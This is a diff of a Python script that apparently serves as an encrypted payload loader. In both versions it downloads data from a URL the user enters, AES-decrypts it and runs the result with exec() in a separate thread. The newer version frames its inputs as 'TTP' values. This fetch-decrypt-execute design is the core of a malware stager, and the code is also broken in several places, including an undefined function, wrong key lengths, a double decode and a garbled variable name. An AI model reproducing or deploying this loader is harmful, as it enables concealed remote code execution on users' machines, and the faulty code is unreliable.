@@ -1,83 +1,42 @@
-
-from urllib.request import urlopen
-
+import requests
 from Crypto.Cipher import AES
-
-import os
-
+import base64
 import threading
+import sys
 
+# Encryption key and initialization vector (iv) should be obtained securely in a real-world scenario
+encryption_key = b'your_32_byte_aes_key_here'  # Replace with your actual key
+iv = b'your_16_byte_iv_here'                   # Replace with your actual IV
 
-# Assuming this is your secure storage for the AES key and initialization vector (IV)
-
-aes_key = b'your_256_bit_secret_here_1234567890abcdef'  # Make sure to replace with a real key, not hardcoded!
-
-iv = os.urandom(16)  # Secure random IV for AES-GCM
-
-cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
-
-
-def decrypt_and_execute(encrypted_data):
-
+def decrypt(ciphertext):
     try:
+        cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
+        plaintext = cipher.decrypt(base64.b64decode(ciphertext))
+        return plaintext.strip()  # Remove padding if necessary
+    except ValueError:
+        print("Incorrect decryption", file=sys.stderr)
+        sys.exit(1)
 
-        ciphertext, tag = encrypted_data[:-16], encrypted_data[-16:]  # Split into ciphertext and tag
-
-        plaintext = cipher.decrypt(ciphertext, tag)
-
-
-        def run_in_thread():
-
-            try:
-
-                exec(plaintext.decode('utf-8'))  # Be cautious with this approach! Executing code can be dangerous.
-
-            except Exception as e:
-
-                print("An error occurred while executing the decrypted data:", str(e))
-
-
-        thread = threading.Thread(target=run_in_thread)
-
-        thread.start()
-
-    except Exception as e:
-
-        print(f"Decryption failed: {str(e)}")
-
-
-def agent():
-
-    prompt = input("Enter your command or data for decryption and execution: ")
-
-
-    # Step 1 & 2: Assume this function finds the correct URL based on user input.
-
-    url = find_correct_url(prompt)
-
-
-    if not url:
-
-        print("No matching URL found.")
-
-        return
-
-
+def process_data(url, ttp):
     try:
-
-        # Step 3 & 4: Requesting and decrypting data from the webpage
-
-        response = urlopen(url, timeout=10)
-
-        encrypted_data = response.read()
-
-        decrypt_and_execute(encrypted_data)
-
+        response = requests.get(url + "?TTP=" + ttp)
+        encrypted_data = base64.b64decode(response.text)
+        
+        decrypted_data = decrypt(encrypted_data)
+        # Execute the content of the decrypted byte-string data as a new thread
+        def exec_content():
+            print("Executing decrypted data...")
+            exec(decrypted_data.decode('utf-8'))  # Be careful with this, it can be dangerous!
+        
+        t = threading.Thread(target=exec_content)
+        t.start()
+        t.join()
     except Exception as e:
-
-        print("An error occurred while fetching or processing data:", str(e))
-
+        print("An error occurred while processing the URL", file=sysayer)
+        sys.exit(1)
 
 if __name__ == "__main__":
-
-    agent()
+    url = input('Enter TTP URL: ')
+    ttp_code = input('Enter corresponding TTP code: ')
+    
+    process_data(url, ttp_code)
